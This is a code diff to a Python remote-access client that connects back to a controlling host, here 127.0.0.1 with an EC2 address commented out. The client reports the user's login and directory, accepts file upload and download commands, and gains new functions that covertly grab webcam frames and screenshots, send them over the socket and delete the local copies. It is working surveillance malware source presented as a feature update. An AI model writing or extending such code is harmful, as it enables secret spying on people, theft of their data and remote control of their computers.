@@ -1,7 +1,24 @@
+#To add the feature of webcam
 import socket
 import os
-import subprocess
+import pyautogui
 import re
+import subprocess
+import cv2
+
+def webcam(s):
+    cap = cv2.VideoCapture(0) # video capture source camera (Here webcam of laptop)
+    ret,frame = cap.read() # return a single frame in variable `frame`
+    cv2.imwrite('ss.png',frame)
+    transfer(s, "ss.png")
+    subprocess.Popen("del /Q ss.png", shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
+
+def screenshots(s):
+    ss = pyautogui.screenshot()
+    ss.save("ss.png")
+    transfer(s, "ss.png")
+    subprocess.Popen("del /Q ss.png", shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
+
 
 def transfer(s, filename):
     f = open(filename,"rb")
@@ -24,11 +41,12 @@ def get(s, filename):
         f.write(bits)
     f.close()
 
-
 s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
 port = 1234
-s.connect(('192.168.43.236',port))
+#s.connect(('ec2-100-26-161-44.compute-1.amazonaws.com',port))
+s.connect(('127.0.0.1',port))
 s.send(os.getcwd().encode())
+s.send(os.getlogin().encode())
 while True:
     res = s.recv(2048).decode()
     res = res.lower()
@@ -55,6 +73,12 @@ while True:
         continue
     elif 'upload*' in res:
         get(s, res.split("*")[2])
+        continue
+    elif res == 'ss':
+        screenshots(s)
+        continue
+    elif res == "webcam":
+        webcam(s)
         continue
     else:
         s.send((os.getcwd() + ">").encode())
